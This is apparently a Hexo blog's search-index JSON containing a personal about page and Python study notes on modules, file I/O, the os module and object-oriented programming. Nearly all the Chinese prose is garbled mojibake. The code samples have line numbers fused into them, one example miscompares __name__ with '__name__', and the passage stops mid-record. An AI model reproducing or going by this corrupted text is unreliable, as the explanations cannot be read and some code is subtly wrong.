{"meta":{"title":"Sinky's Blog","subtitle":"","description":"","author":"Sinky","url":"https://sinky.top","root":"/"},"pages":[{"title":"Sinky's Blog","date":"2022-08-09T09:54:23.181Z","updated":"2022-08-09T09:54:23.181Z","comments":false,"path":"about/index.html","permalink":"https://sinky.top/about/index.html","excerpt":"","text":"è”ç³»æ–¹å¼v+:Sinky94674 å…³äºæˆ‘ï¼š æ¯•ä¸šåå¤‡è€ƒä¸€å¹´å…¬åŠ¡å‘˜å¤±è´¥äº†ï¼Œä½†æ˜¯è¿™ä¸€å¹´å¤‡è€ƒç»™æˆ‘çš„å¿ƒæ€§ä¸€ä¸ªå¾ˆå¤§çš„ç£¨ç»ƒï¼Œå†³å®šé‡æ–°å¼€å§‹æ‰¾å·¥ä½œï¼Œä¸è€ƒäº†ï¼Œè¿™ä¸€å¹´æ— æ¯”æ€€å¿µå½“åˆè·Ÿæœ‹å‹ä¸€èµ·æ‰“ctfä¸€èµ·å­¦ä¹ çš„æ—¶å…‰ï¼Œç°åœ¨å¸Œæœ›èƒ½å¤ŸæŠŠæŠ€æœ¯å­¦å›æ¥ï¼Œå¸Œæœ›ä¸æ­¢å›å½’æ›¾ç»çš„æ°´å¹³ï¼Œè¿˜å¸Œæœ›èƒ½å¤Ÿè¿›æ­¥ï¼Œä¹Ÿå¸Œæœ›èƒ½å¤Ÿåœ¨ä¹æœˆå‰æ‰¾åˆ°ä¸€ä»½é€‚åˆçš„å·¥ä½œï¼Œæ‹¥æœ‰æ–°çš„ä¼™ä¼´å’Œæ–°çš„ç”Ÿæ´»ã€‚ æ„Ÿæ©è¿‡å»çš„å²æœˆæˆå°±äº†å¦‚ä»Šçš„æˆ‘ã€‚"}],"posts":[{"title":"Pythonå­¦ä¹ 9","slug":"pythonå­¦ä¹ 9","date":"2022-09-23T04:08:22.625Z","updated":"2022-09-23T12:18:37.998Z","comments":true,"path":"2022/09/23/pythonå­¦ä¹ 9/","link":"","permalink":"https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/","excerpt":"","text":"æ¨¡å— ä¸€ä¸ªæ¨¡å—ä¸­å¯ä»¥åŒ…å«Nå¤šä¸ªå‡½æ•° åœ¨pythonä¸­ä¸€ä¸ªæ‰©å±•åä¸º.pyçš„æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å— å¥½å¤„ï¼š æ–¹ä¾¿å…¶ä»–ç¨‹åºå’Œè„šæœ¬çš„å¯¼å…¥å¹¶ä½¿ç”¨ é¿å…å‡½æ•°åå’Œå˜é‡åå†²çª æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§ è‡ªå®šä¹‰æ¨¡å— åˆ›å»ºæ¨¡å—ï¼šæ–°å»ºä¸€ä¸ª.pyæ–‡ä»¶ï¼Œå°½é‡ä¸è¦ä¸pythonè‡ªå¸¦çš„æ ‡å‡†åå‘ˆç›¸åŒ å¯¼å…¥æ¨¡å—ï¼š æ‰€æœ‰ï¼š import æ¨¡å—åç§° [as åˆ«å] æŒ‡å®šï¼š from æ¨¡å—åç§° import å‡½æ•°/å˜é‡/ç±» 123456789import math#å…³äºæ•°å­¦è¿ç®—print(id(math))print(type(math))#&lt;class 'module'&gt;print(math)#&lt;module 'math' (built-in)&gt;print(math.pi)#3.141592653589793print(dir(math))print(math.pow(2,3))#8.0print(math.ceil(9.00001))#10 ceil å¤©èŠ±æ¿print(math.floor(9.99999))#9 floor åœ°æ¿ æˆ–ï¼š from math import pi import math print(pi)#3.141592653589793 print(pow(2,3))#8 å®šä¹‰ä½ç½®åœ¨builtins.py print(math.pow(2,3))# 8.0 å®šä¹‰ä½ç½®åœ¨math.py eg: (1) åˆ›å»ºcalc.py ä½œä¸ºè‡ªå®šä¹‰æ¨¡å— def add(a,b): return a+b def div(a,b): return a/b (2)åˆ›å»ºdemo3.pyè°ƒç”¨è‡ªå®šä¹‰æ¨¡å—calc.py import calc print(calc.add(10,20)) print(calc.div(10,4)) æˆ– from calc import add print(add(10,20)) ä»¥ä¸»ç¨‹åºå½¢å¼è¿è¡Œåœ¨æ¯ä¸ªæ¨¡å—çš„å®šä¹‰ä¸­éƒ½åŒ…æ‹¬ä¸€ä¸ªè®°å½•æ¨¡å—åç§°çš„å˜é‡__name__ï¼Œç¨‹åºå¯ä»¥æ£€æŸ¥è¯¥å˜é‡ä»¥ç¡®å®šå®ƒåœ¨å“ªä¸ªæ¨¡å—ä¸­æ‰§è¡Œï¼Œè‹¥ä¸€ä¸ªæ¨¡å—ä¸æ˜¯è¢«å¯¼å…¥åˆ°å…¶ä»–ç¨‹åºä¸­æ‰§è¡Œï¼Œé‚£ä¹ˆå®ƒå¯èƒ½åœ¨è§£é‡Šå™¨çš„é¡¶çº§æ¨¡å—ä¸­æ‰§è¡Œï¼Œé¡¶çº§æ¨¡å—çš„__name__å˜é‡çš„å€¼ä¸º__main__ if __name__=='__main__': pass æ–°å»ºcalc1.pyä¸­ï¼š def add(a,b): return a+b if __name__=='__name__': print(add(10,20)) åœ¨demo4.pyä¸­ï¼š import calc1 print(calc1.add(100,200)) åªæœ‰è¿è¡Œcalc1.pyæ—¶ï¼Œæ‰ä¼šæ‰§è¡Œadd(10,20);å½“demo4.pyè°ƒç”¨calc1æ—¶ï¼Œä¸æ‰§è¡Œifè¯­å¥ä¸­çš„å†…å®¹ Pythonä¸­çš„åŒ… åŒ…æ˜¯ä¸€ä¸ªåˆ†å±‚æ¬¡çš„ç›®å½•ç»“æ„ï¼Œå®ƒå°†ä¸€ç»„åŠŸèƒ½ç›¸è¿‘çš„æ¨¡å—ç»„ç»‡åœ¨ä¸€ä¸ªç›®å½•ä¸‹ ä½œç”¨ï¼šä»£ç è§„èŒƒï¼›é¿å…æ¨¡å—åç§°å†²çª åŒ…ä¸ç›®å½•çš„åŒºåˆ«ï¼š åŒ…å«__init__.pyæ–‡ä»¶çš„ç›®å½•ç§°ä½œåŒ… ç›®å½•ä¸­é€šå¸¸ä¸åŒ…å«__init__.pyæ–‡ä»¶ åŒ…çš„å¯¼å…¥ï¼šimport åŒ…å.æ¨¡å—å åŒ…ï¼šNew-&gt;Python package é»˜è®¤æœ‰__init__.py ç›®å½•ï¼šNew-&gt;Directory eg: æ–°å»ºåŒ…pageageï¼Œåœ¨å…¶ä¸‹æ–°å»ºæ¨¡å—moduleA.pyå’ŒmoduleB.py #moduleA.py a=10 #moduleB.py b=100 æ–°å»ºdemo5.pyç”¨äºå¯¼å…¥åŒ…ï¼š import pageage.moduleA as ma #maä¸ºåˆ«å #print(pageage.moduleA.a) print(ma.a) å¯¼å…¥å¸¦æœ‰åŒ…çš„æ¨¡å—æ—¶ï¼š ä½¿ç”¨importæ–¹å¼ï¼Œåªèƒ½è·ŸåŒ…åæˆ–æ¨¡å—å import pageage import calc ä½¿ç”¨fromâ€¦importå¯ä»¥å¯¼å…¥åŒ…ï¼Œæ¨¡å—ï¼Œå‡½æ•°ï¼Œå˜é‡ from pageage import moduleA from pageage.moduleA import a å¸¸ç”¨å†…ç½®æ¨¡å— sys ä¸pythonè§£é‡Šå™¨åŠå…¶ç¯å¢ƒæ“ä½œç›¸å…³çš„æ ‡å‡†åº“ time æä¾›ä¸æ—¶é—´ç›¸å…³çš„å„ç§å‡½æ•°çš„æ ‡å‡†åº“ os è®¿é—®æ“ä½œç³»ç»ŸæœåŠ¡åŠŸèƒ½çš„æ ‡å‡†åº“ calendar æ—¥æœŸç›¸å…³æ ‡å‡†åº“ urllib è¯»å–æ¥è‡ªæˆ‘ç½‘ä¸Šï¼ˆæœåŠ¡å™¨ï¼‰çš„æ•°æ®æ ‡å‡†åº“ json ç”¨äºä½¿ç”¨JSONåºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯¹è±¡ re ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å’Œæ›¿æ¢ math ç®—æœ¯ç›¸å…³æ ‡å‡†åº“ decimal ç²¾ç¡®æ§åˆ¶è¿ç®—ç²¾åº¦ï¼Œæœ‰æ•ˆæ•°ä½å’Œå››èˆäº”å…¥çš„åè¿›åˆ¶è¿ç®— logging æ—¥å¿—ä¿¡æ¯ 123456789101112import sysprint(sys.getsizeof(24))# è·å¾—æ‰€å å†…å­˜å¤§å° 28print(sys.getsizeof(45))#28print(sys.getsizeof(True))#28print(sys.getsizeof(False))#24import timeprint(time.time())#1663919662.3144715print(time.localtime(time.time()))#time.struct_time(tm_year=2022, tm_mon=9, tm_mday=23, tm_hour=15, tm_min=54, tm_sec=53, tm_wday=4, tm_yday=266, tm_isdst=0)import urllib.requestprint(urllib.request.urlopen('http://www.baidu.com').read())import mathprint(math.pi)#3.141592653589793 ç¬¬ä¸‰æ–¹æ¨¡å—çš„å®‰è£…åŠä½¿ç”¨å®‰è£…ï¼špip install æ¨¡å—å ä½¿ç”¨ï¼šimport æ¨¡å—å eg: pip install schedule psï¼šå› ä¸ºæˆ‘ç”µè„‘ä¸­æ˜¯python2 3å…±å­˜ï¼Œæ‰€ä»¥å…ˆå»å®‰è£…äº†ä¸€ä¸‹pip pipä¸‹è½½åœ°å€ï¼š https://pypi.org/project/pip/#files å®‰è£…ï¼špython3.exe -m pip install pip22å…¨å 123456789import scheduleimport timedef job(): print('å“ˆå“ˆ----') #æ¯ä¸‰ç§’æ‰§è¡Œä¸€æ¬¡job()schedule.every(3).seconds.do(job)while True: schedule.run_pending()#å¯åŠ¨ time.sleep(1)#ç»™äºˆç¼“å†²æ—¶é—´ï¼Œä¼‘çœ ä¸€ç§’ ç¼–ç æ ¼å¼pythonè§£é‡Šå™¨ â€”â€”Unicode(å†…å­˜) .pyæ–‡ä»¶ åœ¨ç£ç›˜ä¸Š â€”â€”UTF-8(å¤–å­˜) eg: #encoding=GBK æ–‡ä»¶è¯»å†™ æ–‡ä»¶è¯»å†™ä¿—ç§°â€˜IOæ“ä½œâ€™ å†…ç½®å‡½æ•°open()åˆ›å»ºæ–‡ä»¶å¯¹è±¡ file=open(filename [,mode,encoding]) file: è¢«åˆ›å»ºçš„æ–‡ä»¶å¯¹è±¡ mode: æ‰“å¼€æ¨¡å¼é»˜è®¤ä¸ºåªè¯» encoding: é»˜è®¤æ–‡æœ¬æ–‡ä»¶ä¸­å­—ç¬¦çš„ç¼–å†™æ ¼å¼ä¸ºGBK eg: åœ¨ç£ç›˜ä¸Šåˆ›å»ºa.txtï¼Œå†…å®¹ï¼šâ€™ä¸­å›½â€™ ç”¨pycharmæ‰“å¼€ï¼Œè½¬GBK æ–°å»º.pyæ–‡ä»¶ 123file=open('a.txt','r',encoding='UTF-8')#r åªè¯»print(file.readlines())#['ä¸­å›½\\n']file.close()#å…³é—­ç³»ç»Ÿé‡Šæ”¾èµ„æº ps: è½¬ä¸äº†GBK,åªå¥½åœ¨è¯»å–çš„æ—¶å€™å°±è®¾å®šç¼–ç æ ¼å¼äº† å¸¸ç”¨æ–‡ä»¶æ‰“å¼€æ¨¡å¼æŒ‰æ–‡ä»¶ä¸­æ•°æ®çš„ç»„ç»‡å½¢å¼åˆ†ç±»ï¼š æ–‡æœ¬æ–‡ä»¶ï¼šå­˜å‚¨æ™®é€šâ€™å­—ç¬¦â€™æ–‡æœ¬ï¼Œé»˜è®¤unicodeï¼Œå¯ç”¨txtæ‰“å¼€ äºŒè¿›åˆ¶æ–‡ä»¶ï¼šä»¥â€™å­—èŠ‚â€™å­˜å‚¨ï¼Œå¿…é¡»ç”¨ä¸“ç”¨è½¯ä»¶æ‰“å¼€ æ‰“å¼€æ¨¡å¼ï¼š r åªè¯»ï¼Œæ–‡ä»¶æŒ‡é’ˆåœ¨æ–‡ä»¶å¼€å¤´ w åªå†™ï¼Œæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™è¦†ç›–åŸå†…å®¹ï¼Œæ–‡ä»¶æŒ‡é’ˆåœ¨æ–‡ä»¶å¼€å¤´ a è¿½åŠ ï¼Œæ–‡æœ¬ä¸åœ¨åˆ™åˆ›å»ºï¼Œå­˜åœ¨åˆ™åœ¨åŸå†…å®¹åè¿½åŠ å†…å®¹ï¼Œæ–‡ä»¶æŒ‡é’ˆåœ¨æ–‡ä»¶æœ«å°¾ b ä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œä¸å¯å•ç‹¬ä½¿ç”¨ + è¯»å†™ï¼Œä¸å¯å•ç‹¬ä½¿ç”¨ 123file=open('b.txt','w')file.write('Python')file.close() åˆ›å»ºäº†b.txtï¼Œå†…å®¹ä¸ºï¼šPython eg: åœ¨æ ¹ç›®å½•ä¸‹æ·»åŠ å›¾ç‰‡ï¼šlogo.png 12345src_file=open('logo.png','rb')#æ‰“å¼€logo.png,åªè¯»target_file=open('copylogo.png','wb')#åˆ›å»ºcopylogo.pngtarget_file.write(src_file.read())#è¯»å–çš„logo.pngå†…å®¹å†™åˆ°copylogo.pngä¸­target_file.close()#é‡Šæ”¾èµ„æºsrc_file.close()#é‡Šæ”¾èµ„æº æ–‡ä»¶å¯¹è±¡çš„å¸¸ç”¨æ–¹æ³• read([size]) ä»æ–‡ä»¶ä¸­è¯»sizeä¸ªå­—èŠ‚æˆ–å­—ç¬¦å†…å®¹ï¼Œè¿”å›ç•¥ã€‚è‹¥æ— sizeå€¼åˆ™è¯»å–å…¨éƒ¨ readline() è¯»ä¸€è¡Œ readlines() è¯»æ¯ä¸€è¡Œï¼Œå•ç‹¬æˆå¯¹è±¡æ”¾å…¥åˆ—è¡¨ä¸­ write(str) å°†strå†™å…¥æ–‡ä»¶ writelines(s_list) å°†åˆ—è¡¨s_listå†™å…¥æ–‡ä»¶ï¼Œä¸åŠ æ¢è¡Œç¬¦ seek(offest[where]) tell() è¿”å›æ–‡ä»¶æŒ‡é’ˆå½“å‰ä½ç½® flush() ç¼“å†²åŒºå†…å®¹å†™å…¥æ–‡ä»¶ï¼Œä½†ä¸å…³é—­æ–‡ä»¶ close() ç¼“å†²è‚¡æƒå†…å®¹å†™å…¥æ–‡ä»¶ï¼ŒåŒäº‹å…³é—­æ–‡ä»¶ï¼Œé‡Šæ”¾èµ„æº 1234567891011121314151617181920file=open('a.txt','r',encoding='utf-8')print(file.read())#ä¸­å›½\\nç¾ä¸½print(file.read(2))#ä¸­å›½print(file.readline())#ä¸­å›½print(file.readlines())#['ä¸­å›½\\n', 'ç¾ä¸½'] #seek tell writelinesfile=open('c.txt','a')file.write('hello')lst=['java','go','python']file.writelines(lst)#hellohellojavagopythonfile=open('c.txt','r')file.seek(2)#ä»ç¬¬äºŒä¸ªå­—èŠ‚å¼€å§‹è¯»print(file.read())#llohellojavagopythonprint(file.tell())#22 #flush()file=open('d.txt','a')file.write('hello')file.flush()file.write(' world')#hello worldfile.close() withè¯­å¥ï¼ˆä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼‰è‡ªåŠ¨ç®¡ç†ä¸Šä¸‹æ–‡èµ„æºï¼Œç¡®ä¿æ–‡ä»¶æ­£ç¡®å…³é—­é‡Šæ”¾èµ„æº 12345with open('b.txt','r') as file: print(file.read())#Pythonwith open('logo.png','rb') as src_file: with open('copy2logo.png','wb') as target_file: target_file.write(src_file.read()) ç›®å½•æ“ä½œosæ¨¡å—ä¸æ“ä½œç³»ç»Ÿæœ‰å…³ osæ¨¡å—ä¸os.pathæ¨¡å—å¯¹ç›®å½•æˆ–æ–‡ä»¶æ“ä½œ 12345import osos.system('notepad.exe')#æ‰“å¼€è®°äº‹æœ¬os.system(('calc.exe'))#æ‰“å¼€è®¡ç®—å™¨ #ç›´æ¥è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶os.startfile('..\\\\Tencent\\\\QQ\\\\Bin\\\\QQ.exe')# æ‰“å¼€QQ ç›¸å…³å‡½æ•° getcwd() è¿”å›å½“å‰å·¥ä½œç›®å½• listdir(path) è¿”å›æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ä¿¡æ¯ mkdir(path [,mode]) åˆ›å»ºç›®å½• makedirs(path/path1/â€¦â€¦ï¼‰ åˆ›å»ºå¤šçº§ç›®å½• rmdir() åˆ é™¤ç›®å½• removedirs() åˆ é™¤å¤šçº§ç›®å½• chdir() å°†pathè®¾ç½®ä¸ºå½“å‰å·¥ä½œç›®å½• 12345678910import osprint(os.getcwd())lst=os.listdir('../pythonå­¦ä¹ ä¸‹-é¢å‘å¯¹è±¡')print(lst)os.mkdir('newdir')os.makedirs('A/B/C') #os.rmdir('newdir') #os.removedirs('A/B/C')os.chdir('..\\\\pythonå­¦ä¹ ä¸‹-é¢å‘å¯¹è±¡')print(os.getcwd()) os.pathæ¨¡å—ç›¸å…³å‡½æ•° abspath(path) è·å–ç»å¯¹è·¯å¾„ exists() åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œåœ¨True,ä¸åœ¨False join(path,name) å°†ç›®å½•ä¸ç›®å½•æˆ–æ–‡ä»¶åæ‹¼æ¥èµ·æ¥ splitext() åˆ†ç¦»æ–‡ä»¶åå’Œæ‰©å±•å basename() ä»ä¸€ä¸ªç›®å½•ä¸­æå–æ–‡ä»¶å dirname(path) ä»ä¸€ä¸ªè·¯å¾„ä¸­æå–æ–‡ä»¶è·¯å¾„ï¼Œä¸åŒ…æ‹¬æ–‡ä»¶å isdir(path) ç”¨äºåˆ¤æ–­æ˜¯å¦ä¸ºè·¯å¾„ 12345678import os.pathprint(os.path.abspath('demo14.py'))print(os.path.exists('demo2.py')) # Trueprint((os.path.join('D:\\\\','demo14.py'))) #D:\\demo14.pyprint(os.path.split('demo14.py')) #('', 'demo14.py')print(os.path.splitext('demo14.py')) #('demo14', '.py')print(os.path.basename('D:\\demo14.py')) #demo14.pyprint(os.path.dirname('D:\\demo14.py')) #D:\\ eg: åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰pyæ–‡ä»¶ 123456import ospath=os.getcwd()lst=os.listdir(path)for filename in lst: if filename.endswith('.py'): print(filename) eg: ç›®å½•å¦‚ä¸‹ï¼š python: demo16.py newdir: 1.py 2.py sub: sub1.py 12345678910111213import ospath=os.getcwd()lst_files=os.walk(path)for dirpath,dirname,filename in lst_files: print(dirpath) print(dirname) print(filename) print('-------------') for dir in dirname: print(os.path.join(dirpath,dir)) for file in filename: print(os.path.join(dirpath,file)) print('------------------')","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"Pythonå­¦ä¹ 8","slug":"pythonå­¦ä¹ 8","date":"2022-09-19T11:54:03.008Z","updated":"2022-09-21T13:44:42.826Z","comments":true,"path":"2022/09/19/pythonå­¦ä¹ 8/","link":"","permalink":"https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/","excerpt":"","text":"é¢å‘å¯¹è±¡ç¯‡å•¦ï¼ï¼ï¼ï¼ ç±»ä¸å¯¹è±¡ç±»ï¼šå¤šä¸ªç±»ä¼¼äº‹ç‰©ç»„æˆçš„ç¾¤ä½“ï¼›æ•°æ®ç±»å‹ å¯¹è±¡ï¼š100ï¼Œ99æ˜¯intç±»ä¸‹åŒ…å«çš„ç›¸ä¼¼ä¸ç›¸åŒä¸ªä¾‹ï¼Œç§°ä¸ºå®ä¾‹æˆ–å¯¹è±¡ï¼ˆä¸€åˆ‡çš†å¯¹è±¡ï¼‰ ç±»çš„åˆ›å»º12class Student: pass ç±»çš„ç»„æˆï¼šç±»å±æ€§ã€å®ä¾‹æ–¹æ³•ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³• 12345678910111213141516171819class Student:#Studentä¸ºç±»åï¼Œç”±ä¸€ä¸ªæˆ–å¤šä¸ªå•è¯ç»„æˆï¼Œæ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ï¼Œå…¶ä½™å°å†™ native_pace='å†…è’™'#ç›´æ¥å†™åœ¨ç±»ä¸­çš„å˜é‡æˆä¸ºç±»å±æ€§ def __init__(self,name,age):#åˆå§‹åŒ– self.name=name#self.nameæˆä¸ºå®ä½“å±æ€§ï¼Œè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œå°†å±€éƒ¨å˜é‡nameå€¼èµ‹ç»™å®ä½“å±æ€§ self.age=age #å®ä¾‹æ–¹æ³• def eat(self): print('å­¦ç”Ÿåƒé¥­å‡½æ•°') #é™æ€æ–¹æ³• @staticmethod def method(): print('ä½¿ç”¨staticmethodè¿›è¡Œä¿®é¥°ï¼Œä¸ºé™æ€æ–¹æ³•') #ç±»æ–¹æ³• @classmethod def cm(cls): print('ä½¿ç”¨classmethodè¿›è¡Œä¿®é¥°ï¼Œä¸ºç±»æ–¹æ³•') #åœ¨ç±»ä¹‹å¤–å®šä¹‰çš„ç§°ä¸ºå‡½æ•°ï¼Œåœ¨ä¹‹å†…çš„ç§°ä¸ºæ–¹æ³•def drink(): print('ç±»ä¹‹å¤–å®šä¹‰çš„ï¼Œæ˜¯å‡½æ•°') å¯¹è±¡çš„åˆ›å»ºåˆç§°ç±»çš„å®ä¾‹åŒ–ï¼šå®ä¾‹å=ç±»å() 12345stu=Student('Jack',20)print(stu.name)#å®ä¾‹å±æ€§#Jackprint(stu.age)#20stu.eat()#å­¦ç”Ÿåƒé¥­å‡½æ•°Student.eat(stu)#å­¦ç”Ÿåƒé¥­å‡½æ•°,äºŒè€…åŠŸèƒ½ç›¸åŒ ç±»å±æ€§ï¼Œç±»æ–¹æ³•ï¼Œé™æ€æ–¹æ³•1.ç±»å±æ€§ï¼šç±»ä¸­æ–¹æ³•å¤–çš„å˜é‡ä¸ºç±»å±æ€§ï¼Œè¢«è¯¥ç±»æ‰€æœ‰å¯¹è±¡å…±äº« 1234567print(Student.native_pace)#å†…è’™stu1=Student('Jack',20)stu2=Student('Rose',30)print(stu1.native_pace)#å†…è’™print(stu2.native_pace)#å†…è’™Student.native_pace='å¤©æ´¥'print(stu1.native_pace)#å¤©æ´¥ 2.ç±»æ–¹æ³•ï¼šä½¿ç”¨@classmethodä¿®é¥°ï¼Œç”¨ç±»åç›´æ¥è®¿é—® Student.cm() 3.é™æ€æ–¹æ³•ï¼šä½¿ç”¨@staticmethodä¿®é¥°ï¼Œç”¨ç±»åç›´æ¥è®¿é—® Student.method() 4.åŠ¨æ€ç»‘å®šå±æ€§å’Œæ–¹æ³• 123456789101112131415class Student: def __init__(self,name,age): self.name=name self.age=age def eat(self): print(self.name+'åœ¨åƒé¥­')stu1=Student('å¼ ä¸‰',20)stu2=Student('æå››',30)stu1.gender='å¥³'#åŠ¨æ€ç»‘å®šå±æ€§print(stu1.name,stu1.age,stu1.gender)#å¼ ä¸‰ 20 å¥³print(stu2.name,stu2.age)#æå›› 30def show():#åŠ¨æ€ç»‘å®šæ–¹æ³• print('å®šä¹‰åœ¨ç±»ä¹‹å¤–ï¼Œç§°ä¸ºå‡½æ•°')stu1.show=showstu1.show()#å®šä¹‰åœ¨ç±»ä¹‹å¤–ï¼Œç§°ä¸ºå‡½æ•° é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹å¾å°è£…æé«˜ç¨‹åºå®‰å…¨æ€§ï¼Œå°†æ•°æ®ï¼ˆå±æ€§ï¼‰å’Œè¡Œä¸ºï¼ˆæ–¹æ³•ï¼‰åŒ…è£…åˆ°ç±»å¯¹è±¡ä¸­ï¼Œåœ¨æ–¹æ³•å†…éƒ¨å¯¹å±æ€§è¿›è¡Œæ“ä½œï¼Œåœ¨ç±»å¯¹è±¡çš„ä¸ºå¤–éƒ¨è°ƒç”¨æ–¹æ³•ã€‚ åœ¨pythonè¡¨å±æ€§ç§æœ‰ï¼Œä¸å¸Œæœ›å±æ€§åœ¨ç±»å¯¹è±¡å¤–éƒ¨è¢«è°ƒç”¨ï¼Œå‰é¢åŠ ä¸¤ä¸ªä¸‹åˆ’çº¿ã€‚ 12345678class Car: def __init__(self,brand): self.brand=brand def start(self): print('æ±½è½¦å·²å¯åŠ¨')car=Car('å®é©¬X5')car.start()#æ±½è½¦å·²å¯åŠ¨print(car.brand)#å®é©¬X5 eg: 123456789101112class Student: def __init__(self,name,age): self.name=name self.__age=age def show(self): print(self.name,self.__age)stu=Student('Jack',20)stu.show()#Jack 20print(stu.name)#Jack #print(stu.__age)#ç±»å¤–ä¸å¯è°ƒç”¨ç§æœ‰print(dir(stu))print(stu._Student__age)#åœ¨ç±»å¤–å¯ä»¥ä½¿ç”¨_Student__ageè®¿é—®ç§æœ‰ ç»§æ‰¿æé«˜çš„ä»£ç å¤ç”¨æ€§ 123456789101112131415161718class Person(object): def __init__(self,name,age): self.name=name self.age=age def info(self): print(self.name,self.age)class Student(Person): def __init__(self,name,age,num): super().__init__(name,age) self.num=numclass Teacher(Person): def __init__(self,name,age,tyear): super().__init__(name,age) self.tyear=tyearstu=Student('Jack',20,'1001')teacher=Teacher('Rose',30,10)stu.info()#Jack 20teacher.info()#Rose 30 å¤šç»§æ‰¿123456class A(object): passclass B(object): passclass C(A,B): pass æ–¹æ³•é‡å†™è‹¥å­ç±»å¯¹çˆ¶ç±»æŸä¸ªå±æ€§æˆ–æ–¹æ³•ä¸æ»¡æ„ï¼Œå¯åœ¨å­ç±»ä¸­å¯¹å…¶è¿›è¡Œé‡å†™ å­ç±»é‡å†™åçš„æ–¹æ³•å¯ç”¨super().xxxè°ƒç”¨çˆ¶ç±»2ä¸­è¢«é‡å†™çš„æ–¹æ³• 1234567891011121314151617181920212223242526class Person(object): def __init__(self,name,age): self.name=name self.age=age def info(self): print(self.name,self.age)class Student(Person): def __init__(self,name,age,num): super().__init__(name,age) self.num=num #æ–¹æ³•é‡å†™ def info(self): super().info() print(self.num)class Teacher(Person): def __init__(self,name,age,tyear): super().__init__(name,age) self.tyear=tyear #æ–¹æ³•é‡å†™ def info(self): super().info() print(self.tyear)stu=Student('Jack',20,'1001')teacher=Teacher('Rose',30,10)stu.info()#Jack 20 1001teacher.info()#Rose 30 10 objectç±» æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±» å†…ç½®å‡½æ•°dir()å¯æŸ¥çœ‹æŒ‡å®šå¯¹è±¡æ‰€æœ‰å±æ€§ __str__()æ–¹æ³•ï¼šè¿”å›ä¸€ä¸ªå¯¹äºå¯¹è±¡çš„æè¿°ï¼Œå¯¹åº”äºå†…ç½®å‡½æ•°str()ç»å¸¸ç”¨äºprint()æ–¹æ³•ï¼ŒæŸ¥çœ‹å¯¹è±¡ä¿¡æ¯ 12345678910class Student: def __init__(self,name,age): self.name=name self.age=age def __str__(self): return 'æˆ‘åå­—æ˜¯{0},ä»Šå¹´{1}å²'.format(self.name,self.age)stu=Student('Jack',20)print(dir(stu))print(stu)#æˆ‘åå­—æ˜¯Jack,ä»Šå¹´20å²print(type(stu))#&lt;class '__main__.Student'&gt; å¤šæ€1.ä¸çŸ¥å˜é‡å¼•ç”¨ç±»å‹ï¼Œä»å¯ä»¥ç”¨æ­¤å˜é‡è°ƒç”¨æ–¹æ³•ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ ¹æ®å˜é‡æ‰€ç”¨å¯¹è±¡ç±»å‹ï¼ŒåŠ¨æ€å†³å®šè°ƒç”¨å“ªä¸ªå¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ 123456789101112131415161718class Animal: def eat(self): print('åŠ¨ç‰©åƒä¸œè¥¿')class Dog(Animal): def eat(self): print('ç‹—åƒéª¨å¤´')class Cat(Animal): def eat(self): print('çŒ«åƒé±¼')class Person: def eat(self): print('äººåƒé¥­')def fun(obj): obj.eat()fun(Cat())#çŒ«åƒé±¼fun(Dog())#ç‹—åƒéª¨å¤´fun(Animal())#åŠ¨ç‰©åƒä¸œè¥¿fun(Person())#äººåƒé¥­ 2.é™æ€è¯­è¨€ä¸åŠ¨æ€è¯­è¨€ ï¼ˆ1ï¼‰é™æ€è¯­è¨€å®ç°å¤šæ€çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶ï¼šç»§æ‰¿ã€æ–¹æ³•é‡å†™ã€çˆ¶ç±»å¼•ç”¨ã€‚æŒ‡å‘å­ç±»å¯¹è±¡ã€‚ ï¼ˆ2ï¼‰åŠ¨æ€è¯­è¨€çš„å¤šæ€å´‡å°šâ€œé¸­å­ç±»å‹â€ï¼Œå½“çœ‹åˆ°ä¸€åªé¸Ÿèµ°èµ·æ¥åƒé¸­å­ï¼Œæ¸¸æ³³ä¼¼é¸­ï¼Œæ”¶èµ·æ¥ä¹Ÿä¼¼é¸­ï¼Œé‚£ä¹ˆè¿™åªé¸Ÿå¯è¢«ç§°ä¸ºé¸­å­ã€‚åœ¨é¸­å­ç±»å‹ä¸­ï¼Œæ— éœ€å…³å¿ƒå¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œåˆ°åº•æ˜¯ä¸æ˜¯é¸­å­ï¼Œåªå…³å¿ƒå¯¹è±¡çš„è¡Œä¸ºã€‚ ç‰¹æ®Šæ–¹æ³•å’Œç‰¹æ®Šå±æ€§ç‰¹æ®Šå±æ€§__dict__è·å¾—ç±»å¯¹è±¡æˆ–è€…å®ä¾‹å¯¹è±¡æ‰€ç»‘å®šçš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•çš„å­—å…¸ 1234567891011121314151617print(dir(object))class A: passclass B: passclass C(A,B): def __init__(self,name,age): self.name=name self.age=agex=C('Jack',20)# xä¸ºCç±»çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡print(x.__dict__)#å®ä¾‹å¯¹è±¡çš„å±æ€§å­—å…¸ {'name': 'Jack', 'age': 20}print(C.__dict__)#{'__module__': '__main__', '__init__': &lt;function 